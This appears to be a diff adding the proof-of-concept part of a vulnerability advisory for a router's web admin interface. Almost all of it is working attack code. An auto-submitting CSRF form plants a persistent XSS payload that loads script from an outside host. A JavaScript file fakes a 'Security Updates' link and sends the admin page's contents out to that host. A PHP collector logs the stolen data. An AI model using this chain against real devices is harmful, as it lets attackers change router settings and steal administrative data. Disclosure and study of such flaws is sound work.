@@ -1,0 +1,72 @@
+Proof of Concept:
+
+  Include a random user-specific token in forms.
+
+  Example form (exploits persistent XSS):
+
+  <html>
+  <body onload="document.CSRF.submit()">
+  <FORM name="CSRF" METHOD="POST"
+ACTION="http://192.168.1.1/Forms/General_1">
+  <INPUT NAME="sysSystemName" VALUE="<script src='http://nx.fi/X'>"
+  <INPUT NAME="sysDomainName" VALUE="evil.com">
+  <INPUT NAME="StdioTimout" VALUE="0">
+  <INPUT NAME="sysSubmit" VALUE="Apply">
+  </form>
+  </body>
+  </html>
+
+X:
+- ------
+document.write("Security Updates - <a
+href='http://www.checkpoint.com/'>http://www.zyxel.com</a>");
+
+function getPage(){
+i = 0;
+data = encodeURIComponent(document.body.innerHTML);
+
+
+while (i < data.length)
+{
+
+        tmp = data.substr(i, 4096);
+        (new Image()).src = "http://nx.fi/xss/getinfo.php?page=" + tmp;
+        i += 4096;
+}
+
+}
+
+setTimeout("getPage()", 1000);
+- ------
+
+getinfo.php:
+- ------
+<?php
+
+$sent = isset($_REQUEST['page']);
+$data = "";
+
+if($sent)
+{
+
+        $data .= "<pre>";
+        foreach($_REQUEST as $tmp) {
+        $data .= htmlspecialchars(urldecode($tmp));
+}
+
+$data .= "</pre>";
+
+$myfile = "log.html";
+$handle = fopen($myfile, 'a');
+fwrite($handle, $data);
+fclose($handle);
+
+}
+
+
+?>
+- ------
+
+Notice that you 'system name' variable is limited in length, so you'll
+need a relatively short URL.
+
